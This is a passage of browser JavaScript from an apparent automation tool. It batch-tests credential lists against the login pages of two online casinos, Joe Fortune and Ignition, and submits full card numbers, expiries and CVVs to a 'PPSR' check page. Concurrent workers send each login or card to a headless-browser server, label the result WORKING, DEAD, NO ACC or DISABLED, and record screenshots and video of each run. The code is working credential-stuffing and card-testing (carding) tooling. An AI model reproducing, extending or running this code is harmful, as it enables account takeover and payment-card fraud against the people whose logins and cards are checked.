  return _html2canvasPromise;
}

// ── Screenshot Overlay Builders (BUG-10 fix) ──────────────
/**
 * Builds an overlay DOM element simulating a login form with credentials filled in.
 * Used for Screenshot 1 of 4 in the debug screenshot sequence.
 * @param {{ siteName: string, loginUrl: string, username: string, shotLabel: string }} opts
 * @returns {HTMLDivElement} Overlay element ready to append to document.body.
 */
function buildFormOverlay({ siteName, loginUrl, username, shotLabel }) {
  const el = document.createElement('div');
  el.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;background:#0f172a;display:flex;align-items:center;justify-content:center;font-family:system-ui,sans-serif;color:#fff;padding:24px;box-sizing:border-box';
  el.innerHTML = `
    <div style="width:100%;max-width:420px;background:#1e293b;border-radius:16px;padding:28px;box-shadow:0 8px 40px rgba(0,0,0,.7)">
      <div style="font-size:0.7rem;color:#64748b;margin-bottom:16px;font-family:monospace;word-break:break-all">${loginUrl}</div>
      <h2 style="margin:0 0 24px;font-size:1.2rem;color:#f1f5f9">${siteName} — Sign In</h2>
      <div style="margin-bottom:14px"><label style="font-size:0.72rem;color:#94a3b8;display:block;margin-bottom:6px">Username / Email</label>
        <div style="background:#0f172a;border:1px solid #334155;border-radius:8px;padding:10px 14px;font-size:0.92rem;color:#e2e8f0">${username}</div></div>
      <div style="margin-bottom:22px"><label style="font-size:0.72rem;color:#94a3b8;display:block;margin-bottom:6px">Password</label>
        <div style="background:#0f172a;border:1px solid #334155;border-radius:8px;padding:10px 14px;font-size:0.92rem;color:#e2e8f0;letter-spacing:4px">••••••••••••</div></div>
      <div style="background:#3b82f6;border-radius:8px;padding:12px;text-align:center;font-weight:700;font-size:1rem;letter-spacing:0.5px;color:#fff">SIGN IN</div>
      <div style="margin-top:18px;font-size:0.68rem;color:#3b82f6;text-align:center;font-weight:600;font-family:monospace">${shotLabel}</div>
    </div>`;
  return el;
}

/**
 * Builds an overlay DOM element showing the first HTTP response from a login or PPSR check.
 * Used for Screenshot 2 of 4.
 * @param {{ siteName: string, loginUrl: string, outcomeText: string, httpStatus: string, isWorking: boolean, shotLabel: string }} opts
 * @returns {HTMLDivElement} Overlay element.
 */
function buildResponseOverlay({ siteName, loginUrl, outcomeText, httpStatus, isWorking, shotLabel }) {
  const color = isWorking ? '#22c55e' : '#ef4444';
  const el = document.createElement('div');
  el.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;background:#0f172a;display:flex;align-items:center;justify-content:center;font-family:system-ui,sans-serif;color:#fff;padding:24px;box-sizing:border-box';
  el.innerHTML = `
    <div style="width:100%;max-width:420px;background:#1e293b;border-radius:16px;padding:28px;box-shadow:0 8px 40px rgba(0,0,0,.7)">
      <div style="font-size:0.7rem;color:#64748b;margin-bottom:16px;font-family:monospace;word-break:break-all">${loginUrl}</div>
      <h2 style="margin:0 0 20px;font-size:1.2rem;color:#f1f5f9">${siteName} — First Response</h2>
      <div style="background:#0f172a;border-radius:8px;padding:16px;margin-bottom:12px">
        <div style="font-size:0.72rem;color:#64748b;font-family:monospace;margin-bottom:8px">${httpStatus}</div>
        <div style="font-size:1rem;color:${color};font-weight:700">${outcomeText}</div>
      </div>
      <div style="margin-top:16px;font-size:0.68rem;color:#3b82f6;text-align:center;font-weight:600;font-family:monospace">${shotLabel}</div>
    </div>`;
  return el;
}

/**
 * Builds an overlay simulating a verification/re-check form submission.
 * Only shown for first-run items where the initial result was not WORKING.
 * Used for Screenshot 3 of 4.
 * @param {{ siteName: string, loginUrl: string, username: string, shotLabel: string }} opts
 * @returns {HTMLDivElement} Overlay element.
 */
function buildVerifyOverlay({ siteName, loginUrl, username, shotLabel }) {
  const el = document.createElement('div');
  el.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;background:#0f172a;display:flex;align-items:center;justify-content:center;font-family:system-ui,sans-serif;color:#fff;padding:24px;box-sizing:border-box';
  el.innerHTML = `
    <div style="width:100%;max-width:420px;background:#1e293b;border-radius:16px;padding:28px;box-shadow:0 8px 40px rgba(0,0,0,.7)">
      <div style="background:#92400e;border-radius:6px;padding:8px 14px;font-size:0.78rem;margin-bottom:16px;color:#fde68a;text-align:center">🔄 Re-checking — Verification Pass</div>
      <div style="font-size:0.7rem;color:#64748b;margin-bottom:16px;font-family:monospace;word-break:break-all">${loginUrl}/verify</div>
      <h2 style="margin:0 0 24px;font-size:1.2rem;color:#f1f5f9">${siteName} — Verify Sign In</h2>
      <div style="margin-bottom:14px"><label style="font-size:0.72rem;color:#94a3b8;display:block;margin-bottom:6px">Username / Email</label>
        <div style="background:#0f172a;border:1px solid #92400e;border-radius:8px;padding:10px 14px;font-size:0.92rem;color:#e2e8f0">${username}</div></div>
      <div style="margin-bottom:22px"><label style="font-size:0.72rem;color:#94a3b8;display:block;margin-bottom:6px">Password</label>
        <div style="background:#0f172a;border:1px solid #92400e;border-radius:8px;padding:10px 14px;font-size:0.92rem;color:#e2e8f0;letter-spacing:4px">••••••••••••</div></div>
      <div style="background:#f59e0b;border-radius:8px;padding:12px;text-align:center;font-weight:700;font-size:1rem;color:#000">RE-VERIFY</div>
      <div style="margin-top:18px;font-size:0.68rem;color:#3b82f6;text-align:center;font-weight:600;font-family:monospace">${shotLabel}</div>
    </div>`;
  return el;
}

/**
 * Builds an overlay showing the definitive final result of a login or PPSR check.
 * Used for Screenshot 4 of 4 — taken AFTER state has been updated with the outcome.
 * @param {{ label: string, statusEmoji: string, statusText: string, detail: string, loginUrl: string, durationMs: number, ts: number, shotLabel: string }} opts
 * @returns {HTMLDivElement} Overlay element.
 */
function buildFinalResultOverlay({ label, statusEmoji, statusText, detail, loginUrl, durationMs, ts, shotLabel }) {
  const statusColors = { 'WORKING': '#22c55e', 'DEAD': '#ef4444', 'NO ACC': '#ef4444', 'TEMP DISABLED': '#f59e0b', 'PERM DISABLED': '#dc2626' };
  const color = statusColors[statusText] || '#94a3b8';
  const el = document.createElement('div');
  el.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;background:#0f172a;display:flex;align-items:center;justify-content:center;font-family:system-ui,sans-serif;color:#fff;padding:24px;box-sizing:border-box';
  el.innerHTML = `
    <div style="width:100%;max-width:420px;background:#1e293b;border-radius:16px;padding:28px;box-shadow:0 8px 40px rgba(0,0,0,.7)">
      <div style="text-align:center;margin-bottom:20px">
        <div style="font-size:3rem;margin-bottom:10px">${statusEmoji}</div>
        <div style="font-size:1.6rem;font-weight:800;color:${color}">${statusText}</div>
        <div style="font-size:0.9rem;color:#94a3b8;margin-top:6px">${label}</div>
      </div>
      <div style="background:#0f172a;border-radius:8px;padding:16px">
        <div style="font-size:0.72rem;color:#64748b;margin-bottom:6px">Result detail</div>
        <div style="font-size:0.9rem;color:#e2e8f0;margin-bottom:12px">${detail}</div>
        <div style="font-size:0.68rem;color:#64748b;font-family:monospace;word-break:break-all;margin-bottom:4px">${loginUrl}</div>
        <div style="font-size:0.68rem;color:#64748b">${durationMs}ms · ${new Date(ts).toLocaleTimeString()}</div>
      </div>
      <div style="margin-top:16px;font-size:0.68rem;color:#22c55e;text-align:center;font-weight:600;font-family:monospace">${shotLabel}</div>
    </div>`;
  return el;
}

/**
 * Builds a PPSR card form overlay showing card details as if entered in a PPSR portal.
 * Used for Screenshot 1 of 4 in PPSR card check runs.
 * @param {{ cardNum: string, expiry: string, cvv: string, shotLabel: string, ppsrUrl: string }} opts
 * @returns {HTMLDivElement} Overlay element.
 */
function buildCardFormOverlay({ cardNum, expiry, cvv, shotLabel, ppsrUrl }) {
  const el = document.createElement('div');
  el.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;background:#0f172a;display:flex;align-items:center;justify-content:center;font-family:system-ui,sans-serif;color:#fff;padding:24px;box-sizing:border-box';
  el.innerHTML = `
    <div style="width:100%;max-width:420px;background:#1e293b;border-radius:16px;padding:28px;box-shadow:0 8px 40px rgba(0,0,0,.7)">
      <div style="font-size:0.7rem;color:#64748b;margin-bottom:16px;font-family:monospace;word-break:break-all">${ppsrUrl}</div>
      <h2 style="margin:0 0 24px;font-size:1.2rem;color:#f1f5f9">💳 PPSR CarCheck — Submit</h2>
      <div style="margin-bottom:14px"><label style="font-size:0.72rem;color:#94a3b8;display:block;margin-bottom:6px">Card Number</label>
        <div style="background:#0f172a;border:1px solid #334155;border-radius:8px;padding:10px 14px;font-size:0.92rem;color:#e2e8f0;font-family:monospace">${cardNum}</div></div>
      <div style="display:flex;gap:12px;margin-bottom:22px">
        <div style="flex:1"><label style="font-size:0.72rem;color:#94a3b8;display:block;margin-bottom:6px">Expiry</label>
          <div style="background:#0f172a;border:1px solid #334155;border-radius:8px;padding:10px 14px;font-size:0.92rem;color:#e2e8f0">${expiry}</div></div>
        <div style="flex:1"><label style="font-size:0.72rem;color:#94a3b8;display:block;margin-bottom:6px">CVV</label>
          <div style="background:#0f172a;border:1px solid #334155;border-radius:8px;padding:10px 14px;font-size:0.92rem;color:#e2e8f0">•••</div></div>
      </div>
      <div style="background:#3b82f6;border-radius:8px;padding:12px;text-align:center;font-weight:700;font-size:1rem;color:#fff">SUBMIT CHECK</div>
      <div style="margin-top:18px;font-size:0.68rem;color:#3b82f6;text-align:center;font-weight:600;font-family:monospace">${shotLabel}</div>
    </div>`;
  return el;
}

/**
 * Builds a PPSR response overlay showing the primary check outcome.
 * Used for Screenshot 2 of 4 in PPSR card check runs.
 * @param {{ ppsrUrl: string, outcomeText: string, httpStatus: string, isWorking: boolean, shotLabel: string }} opts
 * @returns {HTMLDivElement} Overlay element.
 */
function buildCardResponseOverlay({ ppsrUrl, outcomeText, httpStatus, isWorking, shotLabel }) {
  const color = isWorking ? '#22c55e' : '#ef4444';
  const el = document.createElement('div');
  el.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;background:#0f172a;display:flex;align-items:center;justify-content:center;font-family:system-ui,sans-serif;color:#fff;padding:24px;box-sizing:border-box';
  el.innerHTML = `
    <div style="width:100%;max-width:420px;background:#1e293b;border-radius:16px;padding:28px;box-shadow:0 8px 40px rgba(0,0,0,.7)">
      <div style="font-size:0.7rem;color:#64748b;margin-bottom:16px;font-family:monospace;word-break:break-all">${ppsrUrl}</div>
      <h2 style="margin:0 0 20px;font-size:1.2rem;color:#f1f5f9">💳 PPSR — First Response</h2>
      <div style="background:#0f172a;border-radius:8px;padding:16px;margin-bottom:12px">
        <div style="font-size:0.72rem;color:#64748b;font-family:monospace;margin-bottom:8px">${httpStatus}</div>
        <div style="font-size:1rem;color:${color};font-weight:700">${outcomeText}</div>
      </div>
      <div style="margin-top:16px;font-size:0.68rem;color:#3b82f6;text-align:center;font-weight:600;font-family:monospace">${shotLabel}</div>
    </div>`;
  return el;
}

/**
 * Builds a PPSR verify overlay simulating the verification pass re-submission.
 * Used for Screenshot 3 of 4 in PPSR card check runs (first-run only).
 * @param {{ ppsrUrl: string, cardNum: string, shotLabel: string }} opts
 * @returns {HTMLDivElement} Overlay element.
 */
function buildCardVerifyOverlay({ ppsrUrl, cardNum, shotLabel }) {
  const el = document.createElement('div');
  el.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;background:#0f172a;display:flex;align-items:center;justify-content:center;font-family:system-ui,sans-serif;color:#fff;padding:24px;box-sizing:border-box';
  el.innerHTML = `
    <div style="width:100%;max-width:420px;background:#1e293b;border-radius:16px;padding:28px;box-shadow:0 8px 40px rgba(0,0,0,.7)">
      <div style="background:#92400e;border-radius:6px;padding:8px 14px;font-size:0.78rem;margin-bottom:16px;color:#fde68a;text-align:center">🔄 Re-checking — PPSR Verification Pass</div>
      <div style="font-size:0.7rem;color:#64748b;margin-bottom:16px;font-family:monospace;word-break:break-all">${ppsrUrl}</div>
      <h2 style="margin:0 0 24px;font-size:1.2rem;color:#f1f5f9">💳 PPSR — Verify Submit</h2>
      <div style="margin-bottom:22px"><label style="font-size:0.72rem;color:#94a3b8;display:block;margin-bottom:6px">Card Number</label>
        <div style="background:#0f172a;border:1px solid #92400e;border-radius:8px;padding:10px 14px;font-size:0.92rem;color:#e2e8f0;font-family:monospace">${cardNum}</div></div>
      <div style="background:#f59e0b;border-radius:8px;padding:12px;text-align:center;font-weight:700;font-size:1rem;color:#000">RE-VERIFY CHECK</div>
      <div style="margin-top:18px;font-size:0.68rem;color:#3b82f6;text-align:center;font-weight:600;font-family:monospace">${shotLabel}</div>
    </div>`;
  return el;
}

/**
 * Builds a PPSR final result overlay showing the definitive outcome.
 * Used for Screenshot 4 of 4 in PPSR card check runs.
 * @param {{ cardNum: string, statusEmoji: string, statusText: string, detail: string, ppsrUrl: string, durationMs: number, ts: number, shotLabel: string }} opts
 * @returns {HTMLDivElement} Overlay element.
 */
function buildCardFinalOverlay({ cardNum, statusEmoji, statusText, detail, ppsrUrl, durationMs, ts, shotLabel }) {
  const color = statusText === 'WORKING' ? '#22c55e' : '#ef4444';
  const el = document.createElement('div');
  el.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;background:#0f172a;display:flex;align-items:center;justify-content:center;font-family:system-ui,sans-serif;color:#fff;padding:24px;box-sizing:border-box';
  el.innerHTML = `
    <div style="width:100%;max-width:420px;background:#1e293b;border-radius:16px;padding:28px;box-shadow:0 8px 40px rgba(0,0,0,.7)">
      <div style="text-align:center;margin-bottom:20px">
        <div style="font-size:3rem;margin-bottom:10px">${statusEmoji}</div>
        <div style="font-size:1.6rem;font-weight:800;color:${color}">${statusText}</div>
        <div style="font-size:0.9rem;color:#94a3b8;margin-top:6px;font-family:monospace">${cardNum}</div>
      </div>
      <div style="background:#0f172a;border-radius:8px;padding:16px">
        <div style="font-size:0.72rem;color:#64748b;margin-bottom:6px">PPSR result</div>
        <div style="font-size:0.9rem;color:#e2e8f0;margin-bottom:12px">${detail}</div>
        <div style="font-size:0.68rem;color:#64748b;font-family:monospace;word-break:break-all;margin-bottom:4px">${ppsrUrl}</div>
        <div style="font-size:0.68rem;color:#64748b">${durationMs}ms · ${new Date(ts).toLocaleTimeString()}</div>
      </div>
      <div style="margin-top:16px;font-size:0.68rem;color:#22c55e;text-align:center;font-weight:600;font-family:monospace">${shotLabel}</div>
    </div>`;
  return el;
}

// ── Screenshot FIFO Queue (BUG-10 fix) ────────────────────
/**
 * @type {Array<Function>} FIFO queue of async screenshot capture tasks.
 * Each task is an async function that builds an overlay, calls html2canvas, stores the result.
 */
const _shotQueue = [];
/** @type {boolean} True while the queue processor is running. Prevents concurrent processing. */
let _shotQueueRunning = false;

/**
 * Processes the screenshot queue serially. Each task appends an overlay to the DOM,
 * captures it with html2canvas, stores the result in state.debugShots, and removes the overlay.
 * Processing pauses between tasks to allow the browser to paint correctly.
 * @returns {Promise<void>}
 */
async function processShotQueue() {
  if (_shotQueueRunning) return;
  _shotQueueRunning = true;
  while (_shotQueue.length > 0) {
    const task = _shotQueue.shift();
    try { await task(); } catch {}
    // brief yield between shots so the browser can paint
    await new Promise(r => setTimeout(r, 80));
  }
  _shotQueueRunning = false;
}

/**
 * Adds a screenshot capture task to the FIFO queue and starts queue processing if idle.
 * Each task injects a temporary overlay into document.body, captures it with html2canvas,
 * saves the result to state.debugShots, and removes the overlay.
 * Screenshots persist until the user explicitly clears them (no auto-eviction cap).
 * BUG-10 fix: replaces the old single-shot flag approach with a queue that never drops shots.
 * @param {Function} buildOverlayFn - Zero-argument function returning an HTMLElement overlay.
 * @param {string} tag - Tag string used in the filename (sanitised).
 * @param {string} note - Human-readable note shown in the screenshot modal.
 */
function enqueueShot(buildOverlayFn, tag, note) {
  if (!state.settings.debugScreenshots) return;
  _shotQueue.push(async () => {
    const overlay = buildOverlayFn();
    document.body.appendChild(overlay);
    try {
      const h2c = await loadHtml2Canvas();
      const canvas = await h2c(overlay, { backgroundColor: '#0f172a', scale: 1.5, useCORS: true, logging: false, allowTaint: true });
      const dataUrl = canvas.toDataURL('image/png');
      const stamp = new Date().toISOString().replace(/[:.]/g, '-');
      state.debugShots.unshift({
        id: crypto.randomUUID(), ts: Date.now(),
        tag: sanitizeFilenamePart(tag), note: note || '',
        filename: `sitchomatic_debug_${sanitizeFilenamePart(tag)}_${stamp}.png`, dataUrl,
      });
      saveDebugShotsQuota();
      if (!$('screenshotModal').classList.contains('hidden')) renderDebugShots();
    } catch {
      if (!state.screenshotEngineUnavailableNotified) {
        toast('Screenshot capture failed — check network for html2canvas CDN', 'error', 4000);
        state.screenshotEngineUnavailableNotified = true;
      }
    } finally { overlay.remove(); }
  });
  void processShotQueue();
}

/**
 * Stores a single pre-captured screenshot (base64 data URL) directly into
 * state.debugShots. Used by the live API path where the server has already
 * taken a real browser screenshot — no html2canvas overlay needed.
 * @param {string} dataUrl - Base64 PNG data URL (data:image/png;base64,...).
 * @param {string} tag - Short identifier tag for filename and display.
 * @param {string} note - Human-readable description shown in screenshot modal.
 */
function saveDebugShot(dataUrl, tag, note, groupId = '') {
  if (!state.settings.debugScreenshots) return;
  if (!dataUrl || !dataUrl.startsWith('data:image')) return;
  const stamp = new Date().toISOString().replace(/[:.]/g, '-');
  state.debugShots.unshift({
    id: crypto.randomUUID(),
    ts: Date.now(),
    tag: sanitizeFilenamePart(tag),
    groupId: groupId || tag,
    note: note || '',
    filename: `sitchomatic_live_${sanitizeFilenamePart(tag)}_${stamp}.png`,
    dataUrl,
  });
  saveDebugShotsQuota();
  if (!$('screenshotModal').classList.contains('hidden')) renderDebugShots();
  scheduleRender();
}

// ── Recording helpers ──────────────────────────────────────
/**
 * Returns the best supported MediaRecorder MIME type for the current browser.
 * Prefers VP9+Opus, falls back to VP8+Opus, then plain WebM, then '' (browser default).
 * @returns {string} Supported MIME type string, or empty string if MediaRecorder unavailable.
 */
function getRecordingMimeType() {
  if (!window.MediaRecorder || typeof MediaRecorder.isTypeSupported !== 'function') return '';
  const candidates = ['video/webm;codecs=vp9,opus', 'video/webm;codecs=vp8,opus', 'video/webm'];
  return candidates.find(m => MediaRecorder.isTypeSupported(m)) || '';
}

/**
 * Safely revokes the object URL stored on a recording artifact.
 * No-ops if the artifact has no blobUrl or the URL has already been revoked.
 * @param {object} rec - Recording artifact object with optional blobUrl property.
 */
function revokeRecordingUrl(rec) {
  if (!rec || !rec.blobUrl) return;
  try { URL.revokeObjectURL(rec.blobUrl); } catch {}
}

/**
 * Clears all in-memory run recordings, revoking all blob object URLs to free memory.
 * Does not affect localStorage (recordings are not persisted).
 */
function clearAllRecordings() {
  state.recordings.forEach(revokeRecordingUrl);
  state.recordings = [];
}

/**
 * Starts a screen recording of the main content area using html2canvas + MediaRecorder.
 * Records at 3fps (low-overhead). Returns the recording ID for later use with stopRunRecording.
 * BUG-08 fix: sets state.recordingActive to null BEFORE awaiting stop, preventing double-finalize.
 * @param {string} runType - Run type identifier ('ppsr' | 'joe' | 'ign').
 * @param {string} label - Human-readable label for the recording artifact.
 * @returns {Promise<string|null>} Recording ID if started, null if unavailable or already recording.
 */
async function startRunRecording(runType, label) {
  if (!window.MediaRecorder) {
    if (!state.recordingEngineUnavailableNotified) {
      toast('MediaRecorder is not available in this browser.', 'error', 3200);
      state.recordingEngineUnavailableNotified = true;
    }
    return null;
  }
  if (state.recordingActive) return null;
  try {
    const h2c = await loadHtml2Canvas();
    const root = document.querySelector('.main-content') || document.body;
    const rect = root.getBoundingClientRect();
    const width  = Math.max(360, Math.round(rect.width  || root.clientWidth  || 960));
    const height = Math.max(240, Math.round(rect.height || root.clientHeight || 540));

    const canvas = document.createElement('canvas');
    canvas.width = width; canvas.height = height;
    const ctx = canvas.getContext('2d', { alpha: false, desynchronized: true });
    if (!ctx || typeof canvas.captureStream !== 'function') {
      if (!state.recordingEngineUnavailableNotified) {
        toast('Video recording is not supported here.', 'error', 3200);
        state.recordingEngineUnavailableNotified = true;
      }
      return null;
    }

    let frameInFlight = false;
    let stopped = false;
    const drawFrame = async () => {
      if (stopped || frameInFlight) return;
      frameInFlight = true;
      try {
        const snap = await h2c(root, { backgroundColor: null, scale: 1, useCORS: true, logging: false });
        ctx.drawImage(snap, 0, 0, width, height);
      } catch {}
      frameInFlight = false;
    };
    await drawFrame();

    const stream = canvas.captureStream(3);
    const mimeType = getRecordingMimeType();
    const recorder = mimeType
      ? new MediaRecorder(stream, { mimeType, videoBitsPerSecond: 1_200_000 })
      : new MediaRecorder(stream);
    const chunks = [];
    recorder.ondataavailable = e => { if (e.data && e.data.size > 0) chunks.push(e.data); };

    const frameTimer = setInterval(() => { void drawFrame(); }, 350);
    recorder.start(1000);

    const id = crypto.randomUUID();
    state.recordingActive = { id, runType, label, startTs: Date.now(), recorder, chunks, stream, frameTimer, stop: () => { stopped = true; }, mimeType };
    renderSessions();
    return id;
  } catch {
    if (!state.recordingEngineUnavailableNotified) {
      toast('Failed to start recording.', 'error', 3200);
      state.recordingEngineUnavailableNotified = true;
    }
    return null;
  }
}

/**
 * Stops the active run recording and finalises it into a recording artifact stored in state.recordings.
 * BUG-08 fix: captures and nullifies state.recordingActive BEFORE awaiting recorder.stop(),
 * so any concurrent call finds null and returns false immediately (prevents double-finalize).
 * @param {string|null} [id=null] - ID to match against active recording (pass null to stop any).
 * @param {string} [reason='completed'] - Reason string ('completed' | 'stopped').
 * @returns {Promise<boolean>} True if a recording was finalised, false otherwise.
 */
async function stopRunRecording(id = null, reason = 'completed') {
  const active = state.recordingActive;
  if (!active) return false;
  if (id && active.id !== id) return false;

  state.recordingActive = null;
  clearInterval(active.frameTimer);
  active.stop();

  const finalize = () => {
    active.stream.getTracks().forEach(t => t.stop());
    const durationMs = Date.now() - active.startTs;
    const blob = new Blob(active.chunks, { type: active.mimeType || 'video/webm' });
    if (blob.size > 0) {
      const blobUrl = URL.createObjectURL(blob);
      state.recordings.unshift(createRecordingArtifact({
        runType: active.runType, label: active.label, reason, durationMs,
        sizeBytes: blob.size, mimeType: blob.type || 'video/webm', blobUrl,
      }));
      if (state.recordings.length > 20) {
        const removed = state.recordings.splice(20);
        removed.forEach(revokeRecordingUrl);
      }
    }
    renderSessions();
    const recModal = $('recordingsModal');
    if (recModal && !recModal.classList.contains('hidden')) renderRecordings();
  };

  if (active.recorder.state === 'inactive') { finalize(); return true; }
  await new Promise(resolve => {
    active.recorder.onstop = () => { finalize(); resolve(true); };
    try { active.recorder.stop(); } catch { finalize(); resolve(true); }
  });
  return true;
}


// ── Login check simulation with 4-shot screenshots ────────
/**
 * Performs a LIVE login check via the automation server API (Playwright Chromium).
 * Calls POST /api/login-check which opens a real headless browser, navigates to
 * the login page, fills credentials, submits, and returns 4 real browser screenshots.
 * Falls back to noAcc outcome if the server is unreachable.
 * @param {object} cred - Credential object with username and password.
 * @param {string} siteId - Stable site identifier: 'joe' or 'ign'.
 * @param {string} siteName - Human-readable site name for activity log.
 * @param {string} loginUrl - Full URL of the casino login page.
 * @returns {Promise<{status: string, detail: string, firstRun: boolean, durationMs: number}>}
 */
async function simulateLoginDetailed(cred, siteId, siteName, loginUrl) {
  const firstRun = !cred.testHistory || cred.testHistory.length === 0;
  const start = Date.now();
  const shotTag = `${siteId}_${sanitizeFilenamePart(cred.username.slice(0, 20))}`;

  try {
    const resp = await fetch('/api/login-check', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        site: siteId,
        username: cred.username,
        password: cred.password,
        loginUrl,
        timeout: (state.settings.loginTimeout || 60) * 1000,
      }),
    });
    if (!resp.ok) throw new Error(`API ${resp.status}`);
    const data = await resp.json();

    const shots = data.shots || ['', '', '', ''];
    const labels = ['[1/4] Form filled', '[2/4] First response', '[3/4] After settle', '[4/4] Final result'];
    const notes = [
      `${siteName} — form filled — ${cred.username}`,
      `${siteName} — first response`,
      `${siteName} — page settled`,
      `${siteName} — ${data.outcome || 'done'}`,
    ];
    shots.forEach((dataUrl, i) => {
      if (dataUrl) saveDebugShot(dataUrl, shotTag + `_${i + 1}_${labels[i].split(' ').pop().toLowerCase()}`, notes[i], shotTag);
    });

    const statusMap = {
      working: CredStatus.WORKING,
      noAcc: CredStatus.NO_ACC,
      permDisabled: CredStatus.PERM_DISABLED,
      tempDisabled: CredStatus.TEMP_DISABLED,
    };
    const status = statusMap[data.outcome] || CredStatus.NO_ACC;
    return { status, detail: data.note || data.outcome, firstRun, durationMs: Date.now() - start };
  } catch (err) {
    return { status: CredStatus.NO_ACC, detail: `Server error: ${err.message}`, firstRun, durationMs: Date.now() - start };
  }
}

/**
 * Performs a LIVE PPSR card check via the automation server API (Playwright Chromium).
 * Calls POST /api/card-check which opens a real headless browser, navigates to the
 * PPSR URL, fills card details, submits, and returns 4 real browser screenshots.
 * Falls back to dead outcome if the server is unreachable.
 * @param {object} card - Card object with number, mm, yy, cvv, totalTests.
 * @param {string} ppsrUrl - Full URL of the card check page.
 * @returns {Promise<{result: string, detail: string, firstRun: boolean, durationMs: number}>}
 */
async function simulateCheckDetailed(card, ppsrUrl) {
  const firstRun = (card.totalTests || 0) === 0;
  const start = Date.now();
  const shotTag = `ppsr_${card.number.slice(-4)}`;

  try {
    const resp = await fetch('/api/card-check', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        number: card.number,
        mm: card.mm,
        yy: card.yy,
        cvv: card.cvv,
        ppsrUrl,
        timeout: (state.settings.checkTimeout || 180) * 1000,
      }),
    });
    if (!resp.ok) throw new Error(`API ${resp.status}`);
    const data = await resp.json();

    const shots = data.shots || ['', '', '', ''];
    const notes = [
      `PPSR — page loaded — ···${card.number.slice(-4)}`,
      `PPSR — form filled — ···${card.number.slice(-4)}`,
      `PPSR — first response`,
      `PPSR — ${data.outcome || 'done'}`,
    ];
    shots.forEach((dataUrl, i) => {
      if (dataUrl) saveDebugShot(dataUrl, `${shotTag}_${i + 1}`, notes[i], shotTag);
    });

    const result = data.outcome === 'working' ? Status.WORKING : Status.DEAD;
    return { result: data.outcome || 'dead', detail: data.note || data.outcome, firstRun, durationMs: Date.now() - start };
  } catch (err) {
    return { result: 'dead', detail: `Server error: ${err.message}`, firstRun, durationMs: Date.now() - start };
  }
}


// ── Run login checks ──────────────────────────────────────
/**
 * Starts a batched virtual headless login check run for a specific site.
 * BUG-04 fix: catch blocks reset credential status from TESTING back to UNTESTED.
 * BUG-07 fix: uses scheduleRender (RAF-debounced) inside worker loop.
 * BUG-08 fix: awaits stopRunRecording instead of fire-and-forget void.
 * BUG-09 fix: passes siteId ('joe'/'ign') not display name to simulateLoginDetailed.
 * @param {'joe'|'ign'} site - Site identifier.
 * @param {string[]|null} [credIds=null] - Specific credential IDs to check; null = all untested.
 */
async function runLoginChecks(site, credIds = null) {
  if (site === 'joe' && state.joeRunning) return;
  if (site === 'ign' && state.ignRunning) return;

  const allCreds = site === 'joe' ? state.joeCreds : state.ignCreds;
  const targets  = credIds
    ? allCreds.filter(c => credIds.includes(c.id) && c.status !== CredStatus.TESTING)
    : allCreds.filter(c => c.status === CredStatus.UNTESTED);

  if (targets.length === 0) { toast('No untested credentials to check', 'info'); return; }

  const abortCtrl = new AbortController();
  if (site === 'joe') { state.joeRunning = true; state.joeAbortController = abortCtrl; }
  else                { state.ignRunning = true; state.ignAbortController = abortCtrl; }
  const signal = abortCtrl.signal;
  const siteName = site === 'joe' ? 'Joe Fortune' : 'Ignition';
  const loginUrl = site === 'joe'
    ? (state.settings.joeLoginUrl || JOE_LOGIN_URL)
    : (state.settings.ignitionLoginUrl || IGNITION_LOGIN_URL);

  showProgress(`Running ${siteName} Login Checks (Virtual Headless)…`, site);
  renderAll();
  const recordingId = await startRunRecording(site, `${siteName} Login`);

  const concurrency = Math.min(state.settings.loginConcurrency, targets.length, 6);
  let done = 0, working = 0, noAcc = 0;
  const queue = [...targets];

  /** @description Worker pulls credentials from the shared queue and processes each one. */
  async function worker() {
    while (queue.length > 0 && !signal.aborted) {
      const cred = queue.shift();
      if (!cred) break;

      const credsArr = site === 'joe' ? state.joeCreds : state.ignCreds;
      const idx = credsArr.findIndex(c => c.id === cred.id);
      if (idx === -1) continue;
      credsArr[idx].status = CredStatus.TESTING;
      scheduleRender();

      try {
        const res = await simulateLoginDetailed(cred, site, siteName, loginUrl);
        if (signal.aborted) break;

        credsArr[idx].status = res.status;
        credsArr[idx].testHistory.unshift({ status: res.status, detail: res.detail, ts: Date.now(), durationMs: res.durationMs });
        if (credsArr[idx].testHistory.length > 50) credsArr[idx].testHistory = credsArr[idx].testHistory.slice(0, 50);

        if (res.status === CredStatus.WORKING) working++;
        else noAcc++;

        state.sessions.unshift({
          id: crypto.randomUUID(), type: site, username: cred.username,
          result: res.status === CredStatus.WORKING ? 'working' : 'dead',
          detail: res.detail, ts: Date.now(), durationMs: res.durationMs,
        });

        const icon = res.status === CredStatus.WORKING ? '✅' : res.status === CredStatus.TEMP_DISABLED ? '⏸' : '❌';
        state.activity.unshift({ icon, label: cred.username, detail: `${siteName}: ${res.detail}`, ts: Date.now() });
        if (state.activity.length > 100) state.activity = state.activity.slice(0, 100);
        saveActivity();

        done++;
        if (site === 'joe') saveJoeCreds(); else saveIgnCreds();
        saveSessions();
        updateProgress(done, targets.length, `${working} working · ${noAcc} no acc/disabled`);
        $('progressWorking').textContent = `${working} working`;
        $('progressDead').textContent    = `${noAcc} no acc`;
        scheduleRender();
      } catch {
        credsArr[idx].status = CredStatus.UNTESTED;
        if (site === 'joe') saveJoeCreds(); else saveIgnCreds();
        done++;
        updateProgress(done, targets.length);
      }
    }
  }

  await Promise.all(Array.from({ length: concurrency }, () => worker()));

  if (site === 'joe') { state.joeRunning = false; state.joeAbortController = null; }
  else                { state.ignRunning = false; state.ignAbortController = null; }
  hideProgress();
  await stopRunRecording(recordingId, signal.aborted ? 'stopped' : 'completed');

